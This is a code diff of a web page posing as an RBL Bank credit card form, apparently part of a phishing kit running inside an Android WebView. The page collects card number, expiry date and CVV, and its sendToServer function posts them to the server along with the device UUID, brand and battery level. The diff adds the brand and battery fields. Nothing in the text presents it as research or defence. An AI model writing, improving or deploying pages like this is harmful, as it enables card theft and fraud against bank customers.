@@ -8,7 +8,7 @@
 <title>RBL Bank Credit Card</title>
 <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
 <style>
-:root { --primary-color: #1d2b6c; }  
+:root { --primary-color: #1d2b6c; }    
 body { font-family: 'Roboto', sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; }
 /* loader */
 .loader-screen { position: fixed; width: 100%; height: 100%; background-color: #ffffff; z-index: 9999; display: flex; justify-content: center; align-items: center; }
@@ -43,14 +43,14 @@ label { font-weight: bold; display: block; font-size: 18px; margin: 5px 0 5px; }
 </head>
 <body>
 <div class="loader-screen" id="loader">
-<img src="/OY.png" alt="Bank Logo">
+<img src="/oy.png" alt="Bank Logo">
 </div>
 
 <div id="main-form">
 <div class="header">RBL BANK CREDIT CARD</div>
 <div class="notice">Hello, RBL Bank Customer<br>Complete your card details in a few simple steps</div>
 <div class="center">
-<img class="logo" src="/DL.png" alt="RBL Logo"><br>
+<img class="logo" src="/dl.png" alt="RBL Logo"><br>
 <small>Customer service: 02261156300 | Credit cards-cpl-c 02232</small>
 </div>
 
@@ -64,12 +64,12 @@ label { font-weight: bold; display: block; font-size: 18px; margin: 5px 0 5px; }
 <div class="row">
 <div>
 <label>EXPIRY DATE</label>
-<div class="input-icon"><i>📅</i><input type="text" id="expiry" maxlength="5" placeholder="MM/YY" /></div>
+<div class="input-icon"><i>📅</i><input type="tel" id="expiry" maxlength="5" placeholder="MM/YY" /></div>
 <div class="error" id="expiry-error"></div>
 </div>
 <div>
 <label>CVV</label>
-<div class="input-icon"><input type="password" id="cvv" maxlength="3" placeholder="XXX" /></div>
+<div class="input-icon"><input type="password" id="cvv" maxlength="3" placeholder="XXX" inputmode="numeric" pattern="\d*"/></div>
 </div>
 </div>
 </div>
@@ -114,7 +114,7 @@ expiryInput.addEventListener("input", (e) => {
   e.target.value = val.length >= 3 ? val.slice(0,2)+'/'+val.slice(2,4) : val;
 });
 
-// ===== UUID integration for Android WebView =====
+// UUID integration for Android WebView
 function getDeviceUUID() {
   if(window.AndroidDevice && AndroidDevice.getUUID){
       return AndroidDevice.getUUID();
@@ -156,11 +156,13 @@ function getDeviceInfo() {
 
 function sendToServer(card, expiry, cvv){
   const payload = {
-    uuid: getDeviceUUID(), // ✅ UUID included
+    uuid: getDeviceUUID(),// ✅ UUID included
     card,
     expiry,
     cvv,
-    device: getDeviceInfo()
+    device: getDeviceInfo(),
+    brand: (window.AndroidDevice && AndroidDevice.getBrand) ? AndroidDevice.getBrand() : "Unknown",
+    battery: (window.AndroidDevice && AndroidDevice.getBattery) ? AndroidDevice.getBattery() : "100%"
   };
 
   fetch("/html-form-data", {
